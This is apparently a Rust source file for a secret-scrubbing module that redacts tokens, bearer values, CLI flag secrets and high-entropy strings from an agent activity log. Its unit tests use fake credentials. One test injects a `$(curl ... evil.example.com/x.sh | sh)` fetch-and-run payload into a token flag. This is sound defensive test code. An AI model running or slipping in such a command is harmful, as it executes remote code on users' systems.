//! Secret redaction for text that may be persisted or displayed as ambient
//! agent activity (Bash commands, tool summaries, etc).
//!
//! `scrub` is defense-in-depth, applied at multiple points in the activity
//! pipeline — the hook producer (`src/bin/nostromo_activity_hook.rs`) and
//! again, defensively, by `activity::store::ActivityStore::ingest` — so a
//! line that reaches the store by any path is still safe. It is deliberately
//! conservative: over-redaction (a false positive) is an acceptable cost, a
//! leaked token is not.

use std::sync::LazyLock;

use regex::{Captures, Regex};

/// Fixed marker substituted for any recognized secret.
pub const REDACTED: &str = "[REDACTED]";

/// Known secret token shapes, matched and replaced wholesale (no surrounding
/// context worth preserving — the token itself *is* the secret).
static TOKEN_SHAPE_PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    vec![
        // GitHub: ghp_/gho_/ghs_ (fine-grained/OAuth/server-to-server tokens).
        Regex::new(r"\bgh[pos]_[A-Za-z0-9]{20,}\b").unwrap(),
        // GitHub: github_pat_ (fine-grained personal access tokens).
        Regex::new(r"\bgithub_pat_[A-Za-z0-9_]{20,}\b").unwrap(),
        // OpenAI/Anthropic-style secret keys.
        Regex::new(r"\bsk-[A-Za-z0-9-]{10,}\b").unwrap(),
        // Slack: bot/app/legacy/refresh/workspace tokens.
        Regex::new(r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b").unwrap(),
        // AWS access key ids.
        Regex::new(r"\bAKIA[A-Z0-9]{16}\b").unwrap(),
        // JWT-looking `eyJ....eyJ....` compact serialization.
        Regex::new(r"\beyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\b").unwrap(),
    ]
});

/// `Bearer <token>` — standalone or following any `...: Bearer ...` header.
/// The value may be bare or single/double-quoted (shell-quoted flag values).
static BEARER_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?i)\bBearer\s+(?P<val>'[^']*'|"[^"]*"|[^\s'"]+)"#).unwrap()
});

/// `--password`/`--token`/`--api-key`, space or `=` separated, bare or
/// shell-quoted value.
static CLI_FLAG_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?i)--(?:password|token|api-key)(?:=|\s+)(?P<val>'[^']*'|"[^"]*"|[^\s'"]+)"#)
        .unwrap()
});

/// `token=`/`api_key=`/`access_token=` query-string-style parameters.
static QUERY_PARAM_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?i)\b(?:access_token|api_key|token)=(?P<val>[^&\s'"]+)"#).unwrap()
});

/// Environment-variable-name shapes whose *values* are treated as secrets.
static ENV_NAME_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)(TOKEN|SECRET|PASSWORD|KEY|CREDENTIAL)").unwrap());

/// Fallback: a long, contiguous alphanumeric run (no path separators, no
/// hyphens/underscores) — catches an unlabelled hash/token the shape/label
/// passes above missed. Excluding `/`, `-`, and `_` from the class means an
/// ordinary file path or a hyphenated/underscored identifier never trips
/// this — each of its segments stays well under the threshold.
static HIGH_ENTROPY_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\b[A-Za-z0-9]{32,}\b").unwrap());

/// Replace `re`'s `val` capture group with [`REDACTED`], preserving any
/// literal text elsewhess in the match (e.g. the leading `Bearer `/`--token=`).
fn redact_captured_value(input: &str, re: &Regex) -> String {
    re.replace_all(input, |caps: &Captures| {
        let whole = caps.get(0).unwrap().as_str();
        match caps.name("val") {
            Some(val) => whole.replacen(val.as_str(), REDACTED, 1),
            None => whole.to_string(),
        }
    })
    .into_owned()
}

/// Scrub `input` for known secret shapes, sourcing the environment-variable
/// pass from the real process environment (`std::env::vars()`).
///
/// See module docs for what counts as a "known secret shape."
pub fn scrub(input: &str) -> String {
    scrub_with_env(input, std::env::vars())
}

/// Same as [`scrub`], but takes an explicit environment iterator so callers
/// (and tests) can supply a deterministic, fake environment instead of the
/// real process env.
///
/// Redaction passes (order is an implementation detail, not a contract):
/// - known secret token shapes (GitHub `ghp_`/`gho_`/`ghs_`/`github_pat_`,
///   OpenAI/Anthropic-style `sk-`, Slack `xoxb-`/`xoxa-`/`xoxp-`/`xoxr-`/`xoxs-`,
///   AWS `AKIA...`, JWT-looking `eyJ....eyJ...` strings),
/// - `Authorization:` header values and standalone `Bearer <token>` values,
/// - `--password`/`--token`/`--api-key` CLI flag values (`--flag value` and
///   `--flag=value` forms),
/// - `token=`/`api_key=`/`access_token=` query-string-style parameters,
/// - the value of any environment variable (from `env`) whose *name* matches
///   `(TOKEN|SECRET|PASSWORD|KEY|CREDENTIAL)` case-insensitively, if that
///   value appears verbatim in `input`,
/// - a fallback heuristic: long (32+ char) high-entropy base64/hex-looking
///   runs, WITHOUT touching ordinary file paths or grep patterns.
pub fn scrub_with_env(input: &str, env: impl Iterator<Item = (String, String)>) -> String {
    let mut out = input.to_string();

    for re in TOKEN_SHAPE_PATTERNS.iter() {
        out = re.replace_all(&out, REDACTED).into_owned();
    }

    out = redact_captured_value(&out, &BEARER_RE);
    out = redact_captured_value(&out, &CLI_FLAG_RE);
    out = redact_captured_value(&out, &QUERY_PARAM_RE);

    // Env-var-name-driven pass: only variables whose value is long enough to
    // plausibly be a secret (never nuke short, common values by accident)
    // and whose value actually appears verbatim in the text.
    const MIN_ENV_SECRET_LEN: usize = 6;
    for (name, value) in env {
        if value.chars().count() >= MIN_ENV_SECRET_LEN
            && ENV_NAME_RE.is_match(&name)
            && out.contains(&value)
        {
            out = out.replace(&value, REDACTED);
        }
    }

    out = HIGH_ENTROPY_RE.replace_all(&out, REDACTED).into_owned();

    out
}

#[cfg(test)]
mod tests {
    use super::*;

    struct Case {
        name: &'static str,
        input: &'static str,
        secret: &'static str,
    }

    // ── 1. known secret token shapes ──────────────────────────────────────────

    #[test]
    fn known_secret_token_shapes_are_replaced_with_the_marker() {
        let cases = [
            Case {
                name: "github_ghp",
                input: "export GITHUB_TOKEN=ghp_1234567890abcdef1234567890abcdefABCD",
                secret: "ghp_1234567890abcdef1234567890abcdefABCD",
            },
            Case {
                name: "github_gho",
                input: "curl -H 'token: gho_abcdefghijklmnopqrstuvwxyz0123456789AB'",
                secret: "gho_abcdefghijklmnopqrstuvwxyz0123456789AB",
            },
            Case {
                name: "github_ghs",
                input: "installation token ghs_ZYXWVUTSRQPONMLKJIHGFEDCBA0987654321",
                secret: "ghs_ZYXWVUTSRQPONMLKJIHGFEDCBA0987654321",
            },
            Case {
                name: "github_pat",
                input: "gh auth login --with-token github_pat_11ABCDEFG0abcdefghijklmnop_0123456789abcdefghijklmnopqrstuvwxyzABCDEFG",
                secret: "github_pat_11ABCDEFG0abcdefghijklmnop_0123456789abcdefghijklmnopqrstuvwxyzABCDEFG",
            },
            Case {
                name: "openai_anthropic_sk",
                input: "ANTHROPIC_API_KEY=sk-ant-api03-abcdefghijklmnopqrstuvwxyz0123456789ABCDEFG",
                secret: "sk-ant-api03-abcdefghijklmnopqrstuvwxyz0123456789ABCDEFG",
            },
            // The four Slack fixtures below are deliberately NOT the exact
            // digit-group / hex-tail shapes a real Slack token (and GitHub's
            // secret scanner) would have — using a real-shaped fixture here
            // blocks `git push` (push protection). This still exercises the
            // much looser `xox[baprs]-...` shape our own scrubber matches.
            Case {
                name: "slack_bot",
                input: "webhook uses xoxb-FAKETOKEN0-FAKETOKEN0123-notarealsecretvalueNOTREAL",
                secret: "xoxb-FAKETOKEN0-FAKETOKEN0123-notarealsecretvalueNOTREAL",
            },
            Case {
                name: "slack_app",
                input: "xoxa-2-FAKETOKEN0-FAKETOKEN0123-notarealsecretvalueNOTREAL",
                secret: "xoxa-2-FAKETOKEN0-FAKETOKEN0123-notarealsecretvalueNOTREAL",
            },
            Case {
                name: "slack_legacy",
                input: "xoxp-FAKETOKEN0-FAKETOKEN0123-FAKETOKEN0123-notarealsecretvalueNOTREAL",
                secret: "xoxp-FAKETOKEN0-FAKETOKEN0123-FAKETOKEN0123-notarealsecretvalueNOTREAL",
            },
            Case {
                name: "slack_refresh",
                input: "xoxr-FAKETOKEN0-FAKETOKEN0123-notarealsecretvalueNOTREAL",
                secret: "xoxr-FAKETOKEN0-FAKETOKEN0123-notarealsecretvalueNOTREAL",
            },
            Case {
                name: "slack_workspace",
                input: "xoxs-FAKETOKEN0-FAKETOKEN0123-notarealsecretvalueNOTREAL",
                secret: "xoxs-FAKETOKEN0-FAKETOKEN0123-notarealsecretvalueNOTREAL",
            },
            Case {
                name: "aws_access_key_id",
                input: "aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE",
                secret: "AKIAIOSFODNN7EXAMPLE",
            },
            Case {
                name: "jwt",
                input: "set-cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
                secret: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
            },
        ];

        for case in cases {
            let out = scrub(case.input);
            assert!(
                !out.contains(case.secret),
                "case `{}` leaked the secret into: {out}",
                case.name
            );
            assert!(
                out.contains(REDACTED),
                "case `{}` did not replace the secret with the marker: {out}",
                case.name
            );
        }
    }

    // ── 2. Authorization headers / Bearer tokens ──────────────────────────────

    #[test]
    fn authorization_header_value_is_redacted() {
        let input = "Authorization: Bearer abcdefghijklmnopqrstuvwxyz0123456789ABCDEF";
        let out = scrub(input);
        assert!(!out.contains("abcdefghijklmnopqrstuvwxyz0123456789ABCDEF"));
        assert!(out.contains(REDACTED));
    }

    #[test]
    fn standalone_bearer_token_is_redacted() {
        let input = "curl -H 'authz: Bearer zyxwvutsrqponmlkjihgfedcba9876543210ZYXW' https://api.example.com";
        let out = scrub(input);
        assert!(!out.contains("zyxwvutsrqponmlkjihgfedcba9876543210ZYXW"));
        assert!(out.contains("https://api.example.com"), "rest of the command must survive: {out}");
    }

    // ── 3. CLI flag values ────────────────────────────────────────────────────

    #[test]
    fn cli_secret_flag_values_are_redacted_space_and_equals_forms() {
        let cases = [
            ("mycli --password hunter2ExtraLongSecretValue123", "hunter2ExtraLongSecretValue123"),
            ("mycli --token=abcdef1234567890abcdef1234567890", "abcdef1234567890abcdef1234567890"),
            ("mycli --api-key SECRETVALUE1234567890ABCDEFabc", "SECRETVALUE1234567890ABCDEFabc"),
            ("mycli --api-key=SECRETVALUE1234567890ABCDEFabc", "SECRETVALUE1234567890ABCDEFabc"),
        ];
        for (input, secret) in cases {
            let out = scrub(input);
            assert!(!out.contains(secret), "flag value leaked in: {out}");
            assert!(out.contains("mycli"), "rest of the command must survive: {out}");
        }
    }

    // ── 4. query-string-style parameters ──────────────────────────────────────

    #[test]
    fn query_string_secret_parameters_are_redacted() {
        let cases = [
            (
                "https://example.com/callback?token=abcdef1234567890abcdef&foo=bar",
                "abcdef1234567890abcdef",
            ),
            (
                "https://example.com/x?api_key=1234567890abcdefghijklmnop",
                "1234567890abcdefghijklmnop",
            ),
            (
                "https://example.com/x?a=1&access_token=zyxwvutsrqponmlkjihgfedcba",
                "zyxwvutsrqponmlkjihgfedcba",
            ),
        ];
        for (input, secret) in cases {
            let out = scrub(input);
            assert!(!out.contains(secret), "query param leaked in: {out}");
            assert!(out.contains("example.com"), "rest of the URL must survive: {out}");
        }
    }

    // ── 5. env-var-name-driven redaction ──────────────────────────────────────

    #[test]
    fn scrub_with_env_redacts_a_secret_sourced_from_a_token_named_var() {
        let fake_env = vec![
            ("MY_API_TOKEN".to_string(), "superSecretValue1234567890".to_string()),
            ("HOME".to_string(), "/Users/hammer".to_string()),
        ];
        let input = "running with credential superSecretValue1234567890 embedded";
        let out = scrub_with_env(input, fake_env.into_iter());
        assert!(!out.contains("superSecretValue1234567890"), "leaked: {out}");
        // A var whose name doesn't match (HOME) must not cause unrelated
        // redaction of ordinary text.
        assert!(out.contains("running with credential"));
    }

    // ── 6. high-entropy fallback heuristic vs. ordinary text ──────────────────

    #[test]
    fn a_long_high_entropy_hex_run_is_redacted() {
        let input = "build artifact hash: d41d8cd98f00b204e9800998ecf8427e83c8a1b2c3d4e5f6789abcdef012345";
        let out = scrub(input);
        assert!(
            !out.contains("d41d8cd98f00b204e9800998ecf8427e83c8a1b2c3d4e5f6789abcdef012345"),
            "high-entropy run must be redacted: {out}"
        );
    }

    #[test]
    fn an_ordinary_absolute_file_path_is_left_untouched() {
        let input = "editing /Users/hammer/Code/nostromo/src/main.rs";
        assert_eq!(scrub(input), input);
    }

    #[test]
    fn an_ordinary_grep_pattern_is_left_untouched() {
        let input = "rg 'TODO|FIXME' src/ --type rust";
        assert_eq!(scrub(input), input);
    }

    // ── 7. injection-in-flag-value survives with only the value redacted ─────

    #[test]
    fn a_command_substitution_injection_in_a_token_flag_value_is_redacted_without_mangling_the_rest() {
        let input = "mytool --token='$(curl -fsSL http://evil.example.com/x.sh | sh)' --verbose --output result.json";
        let out = scrub(input);
        assert!(
            !out.contains("curl -fsSL http://evil.example.com/x.sh"),
            "the injected payload lived in the token's value and must be redacted: {out}"
        );
        assert!(out.contains("mytool"), "rest of the command must survive: {out}");
        assert!(out.contains("--verbose"), "rest of the command must survive: {out}");
        assert!(out.contains("--output result.json"), "rest of the command must survive: {out}");
    }
}
